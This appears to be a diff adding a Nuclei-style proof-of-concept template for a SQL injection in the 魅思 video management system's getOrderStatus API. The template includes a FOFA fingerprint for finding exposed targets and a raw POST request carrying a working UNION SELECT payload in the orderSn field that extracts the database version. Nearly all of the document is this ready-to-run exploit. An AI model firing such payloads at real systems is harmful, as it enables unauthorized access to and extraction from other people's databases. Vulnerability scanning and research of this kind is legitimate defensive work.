@@ -1,0 +1,30 @@
+id: poc-kol6epqvo0g6uws8
+info:
+  name: 魅思-视频管理系统 getOrderStatus SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kol6epqvo0g6uws8'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kol6epqvo0g6uws8
+    fofa: app="魅思-视频管理系统"
+http:
+- raw:
+  - 'POST /api/getOrderStatus HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: close
+
+
+    orderSn='') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(IFNULL(CAST(VERSION() AS NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL-- -'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
